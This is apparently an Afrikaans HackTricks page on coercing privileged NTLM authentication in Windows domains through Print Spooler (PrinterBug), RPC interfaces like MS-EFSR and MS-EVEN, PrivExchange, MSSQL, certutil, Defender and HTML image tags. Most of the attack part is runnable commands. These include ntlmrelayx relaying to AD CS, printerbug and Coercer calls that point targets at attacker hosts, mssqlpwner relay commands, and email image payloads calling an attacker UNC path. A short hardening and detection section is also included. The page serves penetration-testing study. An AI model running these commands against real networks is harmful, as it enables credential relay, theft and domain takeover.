# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is ’n **versameling** **remote authentication triggers**, gekodeer in C# met die MIDL compiler om 3rd party dependencies te vermy.

## Spooler Service Abuse

As die _**Print Spooler**_-diens **enabled** is, kan jy sommige reeds bekende AD credentials gebruik om die Domain Controller se print server te **versoek** om ’n **update** oor nuwe print jobs, en dit bloot sê om die notification na ’n spesifieke system te **stuur**.\
Let daarop dat wanneer ’n printer die notification na arbitrary systems stuur, dit teen daardie **system** moet **authenticate**. Daarom kan ’n attacker die _**Print Spooler**_-diens teen ’n arbitrary system laat authenticate, en die diens sal die **computer account** in hierdie authentication **gebruik**.

Onder die enjinkap misbruik die klassieke **PrinterBug** primitive **`RpcRemoteFindFirstPrinterChangeNotificationEx`** oor **`\\PIPE\\spoolss`**. Die attacker open eers ’n printer/server handle en verskaf dan ’n fake client name in `pszLocalMachine`, sodat die target spooler ’n notification channel **terug na die attacker-controlled host** skep. Daarom is die effek **outbound authentication coercion** eerder as direkte code execution.<sup>[[2]](#references)</sup>\
As jy op soek is na **RCE/LPE** in die spooler self, kyk na [PrintNightmare](printnightmare.md). Hierdie bladsy fokus op **coercion and relay**.

### Vind Windows Servers op die domain

Gebruik PowerShell om Windows hosts te lys. Servers is gewoonlik die hoogste-prioriteit targets, dus fokus eers daarop:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Spooler-dienste wat luister

Gebruik 'n effens gewysigde weergawe van @mysmartlogin (Vincent Le Toux) se [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te kyk of die Spooler Service luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook `rpcdump.py` op Linux gebruik en na die **MS-RPRN**-protokol soek:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Of toets hosts vinnig vanaf Linux met **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
As jy **coercion surfaces** wil **enumerate** in plaas daarvan om net te kontroleer of die spooler endpoint bestaan, gebruik **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Dit is nuttig, omdat die sien van die endpoint in EPM jou slegs vertel dat die print RPC interface geregistreer is. Dit waarborg **nie** dat elke coercion method met jou huidige privileges bereikbaar is, of dat die host ’n bruikbare authentication flow sal uitstuur nie.

### Vra die diens om teen ’n arbitrêre host te authenticate

Jy kan [SpoolSample van hier af](https://github.com/NotMedic/NetNTLMtoSilverTicket) compileer.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Met **Coercer** kan jy die spooler-koppelvlakke direk teiken en vermy om te raai watter RPC-metode blootgestel word:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Moderne RPC-over-TCP callbacks

Moenie aanvaar dat ’n suksesvolle `RpcRemoteFindFirstPrinterChangeNotificationEx`-oproep noodwendig verkeer op TCP/445 moet genereer nie. **Windows 11 22H2 en later gebruik RPC oor TCP vir print-kommunikasie by verstek**; RPC oor named pipes is gedeaktiveer tensy ’n beleid of `RpcUseNamedPipeProtocol=1` dit herstel. Daarom kan legacy SMB-only listeners rapporteer dat die trigger gestuur is, terwyl hulle nooit die callback ontvang nie. Microsoft dokumenteer TCP/135 (Endpoint Mapper) plus dinamiese RPC-poorte vir normale print-RPC, en organisasies kan hierdie reeks beperk of ’n vaste print-RPC-poort kies.<sup>[[10]](#references)</sup>

Huidige **Impacket `ntlmrelayx.py`** sluit ’n RPC relay server en ’n klein Endpoint Mapper in, wat by verstek op TCP/135 geaktiveer is. Hierdie ondersteuning is in Junie 2025 spesifiek saamgevoeg met ’n gedemonstreerde PrinterBug-to-AD-CS chain, wat dit moontlik maak om die geauthentiseerde RPC callback te relay, selfs wanneer die slagoffer nie na SMB/WebDAV terugval nie.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Kyk vir `Setting up RPC Server on port 135` en `RPCD: Received connection` in die relay-uitset. As die RPC call ’n verwagte fout terugstuur, maar niks die listener bereik nie, kontroleer die slagoffer se print RPC transport policy, outbound filtering, DNS resolution en of ’n ander proses reeds TCP/135 besit. Maak ook seker dat `ntlmrelayx` nie met `--no-rpc-server` gestart is nie.

### Dwing HTTP in plaas van SMB af met WebClient

Op stelsels wat steeds **RPC over named pipes** gebruik (legacy builds of policy-restored behavior), lewer klassieke PrinterBug gewoonlik ’n **SMB** authentication aan `\\attacker\share`, wat steeds nuttig is vir **capture**, **relay to HTTP targets** of **relay waar SMB signing afwesig is**.\
Die relay van **SMB to SMB** word egter dikwels deur **SMB signing** geblokkeer, dus kan operators verkies om eerder **HTTP/WebDAV** authentication af te dwing. Dit is nie ’n fallback vir die RPC-over-TCP behavior wat hierbo beskryf word nie.

As die target die **WebClient** service gebruik, kan die listener gespesifiseer word in ’n vorm wat Windows **WebDAV over HTTP** laat gebruik:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Dit is veral nuttig wanneer dit met **`ntlmrelayx --adcs`** of ander HTTP relay targets gekombineer word, omdat dit vermy om op SMB relayability op die gedwonge verbinding staat te maak. Die belangrike voorbehoud is dat **WebClient** op die slagoffer moet loop sodat die HTTP/WebDAV-variant kan werk.

### Kombinering met Unconstrained Delegation

Indien ’n aanvaller ’n rekenaar gekompromitteer het wat vir [Unconstrained Delegation](unconstrained-delegation.md) gekonfigureer is, kan hulle die **printer dwing om te authenticateer teenoor daardie rekenaar**. Die printer-rekenaarrekening se **TGT** word dan in die geheue op die unconstrained-delegation-host gecache, waar die aanvaller dit kan retrieve en hergebruik met [Pass the Ticket](pass-the-ticket.md).

### Opsporing en hardening-notas

Die betroubaarste manier om PrinterBug van ’n DC, PAW of server wat nie druk nie te verwyder, is om die Spooler te stop en te disable. Waar drukwerk vereis word, harden elke moontlike relay-destination (SMB server signing, LDAP signing/channel binding en EPA op HTTP services soos AD CS) eerder as om aan te neem dat die blokkering van TCP/445 op die callback path voldoende is.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Detection should correlate an authenticated call to MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, veral opnum 62/65 met ’n nie-lokale callback-waarde, en ’n onmiddellike uitgaande SMB-, HTTP- of RPC-verbinding vanaf die spooler-gasheer. Stel ’n basislyn vir **interface UUID/opnum en bron-/bestemmingspare** op, nie slegs toegang tot `\PIPE\spoolss` nie, omdat huidige print stacks die callback oor RPC-over-TCP kan plaas.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface op dieselfde spooler-pyp; gebruik Coercer om bereikbare metodes op ’n gegewe gasheer te enumereer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (ook via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: Hierdie metodes aanvaar parameters wat ’n UNC-pad kan bevat (bv. `\\attacker\share`). Wanneer dit verwerk word, sal Windows (in masjien-/gebruikerkonteks) by daardie UNC authenticate, wat NetNTLM capture of relay moontlik maak.\
Vir spooler abuse bly **MS-RPRN opnum 65** die algemeenste en bes gedokumenteerde primitive, omdat die protocol specification uitdruklik bepaal dat die server ’n notification channel terug na die client wat deur `pszLocalMachine` gespesifiseer word, skep.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN oor \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: die target probeer om die verskafde backup log path oop te maak en authenticate by die attacker-controlled UNC.<sup>[[1]](#references)</sup>
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en relay dit dan na AD CS endpoints (ESC8/ESC11 scenarios) of ander privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Die `PrivExchange` attack is die gevolg van ’n flaw wat in die **Exchange Server `PushSubscription` feature** gevind is. Hierdie feature laat toe dat die Exchange server deur enige domain user met ’n mailbox gedwing word om oor HTTP by enige client-provided host te authenticate.

By verstek loop die **Exchange service as SYSTEM** en word dit excessive privileges gegee (spesifiek, dit het **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Hierdie flaw kan uitgebuit word om die **relaying of information to LDAP en daarna die extract van die domain NTDS database** moontlik te maak. In gevalle waar relay na LDAP nie moontlik is nie, kan hierdie flaw steeds gebruik word om na ander hosts binne die domain te relay en daar te authenticate. Suksesvolle exploitation van hierdie attack verleen onmiddellike toegang tot die Domain Admin met enige authenticated domain user account.

## Binne Windows

As jy reeds binne die Windows-masjien is, kan jy Windows dwing om met privileged accounts aan ’n server te connect using:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om die certutil.exe lolbin (Microsoft-ondertekende binary) te gebruik om NTLM authentication af te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via e-pos

As jy die **e-posadres** ken van die gebruiker wat by ’n masjien aanmeld wat jy wil kompromitteer, kan jy eenvoudig vir hom ’n **e-pos met ’n 1x1-prent** stuur, soos
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Wanneer die slagoffer dit oopmaak, probeer Windows om te authenticateer.

### MitM

As jy ’n MitM-aanval kan uitvoer en HTML in ’n bladsy wat deur die slagoffer bekyk word kan inspuit, probeer om ’n prent in te spuit, soos:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Ander maniere om NTLM-verifikasie af te dwing en te phish


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## NTLMv1 cracking

As jy [NTLMv1 challenges kan vaslê, lees hier hoe om hulle te crack](../ntlm/index.html#ntlmv1-attack).\
_Onthou dat jy, om NTLMv1 te crack, Responder challenge na "1122334455667788" moet stel_

## References

- [1] [Unit 42 – Authentication Coercion bly ontwikkel](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC-verbindingopdaterings vir print in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server en Endpoint Mapper vir ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
